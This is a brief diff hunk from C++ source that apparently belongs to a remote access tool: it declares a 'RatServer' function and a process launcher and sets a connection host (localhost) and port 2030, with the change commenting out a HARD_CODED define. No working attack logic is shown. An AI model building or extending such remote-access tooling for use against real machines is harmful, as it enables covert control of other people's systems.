@@ -40,7 +40,7 @@ using namespace std;
 int RatServer(short nPort, char* szServer);
 int startProcess(string Args);
 
-#define HARD_CODED
+//#define HARD_CODED
 #define HOST "127.0.0.1" //Can be Name or IP address
 #define PORT 2030
 
